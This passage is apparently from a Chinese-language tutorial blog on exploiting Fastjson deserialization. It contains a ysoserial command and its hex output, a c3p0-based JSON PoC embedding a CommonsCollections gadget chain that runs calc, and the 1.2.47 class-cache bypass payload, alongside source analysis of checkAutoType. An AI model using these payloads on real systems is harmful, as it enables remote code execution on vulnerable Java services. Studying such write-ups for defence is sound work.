class="comment">//写入ser.bin文件</span></span><br><span class="line">        <span class="comment">//将生成的序列化文件转换为 hex字符串</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] payload = toByteArray(in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadHex</span> <span class="operator">=</span> bytesToHex(payload, payload.length);</span><br><span class="line">        System.out.println(payloadHex);</span><br><span class="line"></span><br><span class="line">        Serializer.deSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(bytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>方式二：ysoserial</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/exploit]</span><br><span class="line">└─$ java -jar ysoserial-all.jar CommonsCollections1 calc.exe | hexdump -ve &#x27;/1 &quot;%02x&quot;&#x27;</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a </span><br></pre></td></tr></table></figure>

<p>或者将以前生成的反序列文件通过cyberchef进行转换，选择任意方式均可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408172819697.png?x-oss-process=style/img-to-webp" alt="image-20250408172819697"></p>
<ul>
<li>构造完整PoC</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737200316F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E5472616E73666F726D65644D617061773FE05DF15A700300024C000E6B65795472616E73666F726D657274002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B4C001076616C75655472616E73666F726D657271007E00057870707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65707400096765744D6574686F64757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001A7371007E00117571007E0016000000027070740006696E766F6B657571007E001A00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00167371007E00117571007E00160000000174000463616C63740004657865637571007E001A0000000171007E001D737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000174000576616C75657400047979797978787672001B6A6176612E6C616E672E616E6E6F746174696F6E2E54617267657400000000000000000000007870;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="3-绕过技巧"><a href="#3-绕过技巧" class="headerlink" title="3. 绕过技巧"></a>3. 绕过技巧</h1><ul>
<li>在fastjson1.2.25版本之后，系统在@type反序列化类时在com.alibaba.fastjson.parser.ParserConfig.java中添加了一个checkAutoType的方法，用于过滤一些恶意的反序列化。</li>
<li>从 <strong>Fastjson 1.2.25 版本开始</strong>，默认情况下 <strong>AutoType 功能是关闭的</strong>，需要手动开启才能通过 <code>@type</code> 字段指定任意类进行反序列化，<strong>但是无论autoType开启以及关闭，都不影响我们利用缓存绕过</strong>。</li>
<li>因此目前最主要的问题就是绕过这个checkAutoType方法进行反序列化利用。</li>
</ul>
<h2 id="3-1-1-2-47利用缓存绕过"><a href="#3-1-1-2-47利用缓存绕过" class="headerlink" title="3.1. 1.2.47利用缓存绕过"></a>3.1. 1.2.47利用缓存绕过</h2><ul>
<li>其中一个关键点就是autoTypeSupport参数，开启autoTypeSupport白名单优先，关闭autoTypeSupport黑名单优先。1.2.25之后默认情况为autoTypeSupport关闭，即黑名单优先原则。（无论autoType开启与否，都不影响利用缓存绕过）</li>
<li>checkAutoType方法分析。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class&lt;?&gt; expectClass 这个就是在反序列化时配置预期加载的类，通常我们是没办法控制的，所以就别想了</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">//是否在白名单中，若类名匹配任意白名单前缀，直接加载类。</span></span><br><span class="line">    	<span class="comment">//开启autoTypeSupport默认白名单优先原则</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//在两个缓存中找，是否有，如果有则直接返回该类。</span></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//关闭autoTypeSupport时默认黑名单优先原则</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>默认黑名单类</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250401095223928.png?x-oss-process=style/img-to-webp" alt="image-20250401095223928"></p>
<ul>
<li>目前能够比较好绕过的就是从缓存找类的方式，只要我们提前将我们的类写入缓存表中，那就可以绕过这个方法的检测。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从mappings中查找是否存在该类</span></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>那么接下来我们的目标就是如果通过将我们的恶意类加载进行mappings缓存表中，那么我们可以通过查找mappings.put方法，那查看哪些可控方法可以使用。</li>
<li>通过查找我们可以看到我们的老朋友com.alibaba.fastjson.util.TypeUtils类，之前见到它的时候还是遍历Getter方法的时候。在这个类中存在一个loadClass方法，而该方法就调用了mappings.put方法，将className插入到mappings中，为我们绕过checkAutoType提供了条件。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//写入mappings</span></span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们又可以找到MiscCodec这个类中又调用了TypeUtils.loadClass，而MiscCodec本身是个反序列化器，且会在ParserConfig初始化时进行配置，<code>;</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">deserializers.put(Class.class, MiscCodec.instance)</span><br><span class="line">deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(JSONPath.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(SimpleDateFormat.class, MiscCodec.instance);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>也就是说当Class.class类型或者下面的这些类类型反序列化时都会调用MiscCodec.instance这个反序列化器，而调用这个返序列化器，就会将val对应的反序列化的类写入到mappings中。</p>
</li>
<li><p>那么只要需要使用这些类去加载这些类加载器去加载我们的恶意类就好了。</p>
</li>
<li><p>提前加载了这个恶意类加载到mappings中，到在cheakAutoType中去查找缓存的时候就会返回，从而绕过黑白名单检测机制。</p>
</li>
</ul>
<hr>
<ul>
<li><p><strong>那么接下来就是具体的绕过实际的PoC编写了</strong></p>
</li>
<li><p>首先我们选择一个我们要反序列化的类，我们要使用的反序列化器是MiscCodec.instance，因此我们在以上的class类型中寻找一个，例如我们可以选择java.lang.class，属于Class类型，且是JDK自带的类。然后我们需要设置val的值，为什么是设置val的值呢，因为MiscCodec类的代码实现就是将val的值使用TypeUtils.loadClass进行类加载。</p>
<ul>
<li><p>为什么不选择其他Class类型？</p>
</li>
<li><h4 id="类加载的天然属性"><a href="#类加载的天然属性" class="headerlink" title="类加载的天然属性"></a><strong>类加载的天然属性</strong></h4><ul>
<li><strong><code>java.lang.Class</code> 是 Java 反射的核心类</strong>：其反序列化逻辑天然支持通过字段值（如 <code>val</code>）<strong>动态加载类名</strong>，而其他类（如 <code>UUID</code>、<code>TimeZone</code>）的反序列化逻辑仅处理自身数据结构，<strong>不涉及类加载</strong>。</li>
<li>例如，反序列化<code>UUID</code>只会生成一个UUID对象，而不会将任何新类名存入缓存。</li>
</ul>
</li>
</ul>
</li>
<li><p>PoC如下</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这样我们就可以将com.sun.rowset.JdbcRowSetImpl写入到mappings缓存中，再次调用cheakAutoType方法来检测恶意类的时候，发现缓存中存在这个类就会直接返回。</li>
</ul>
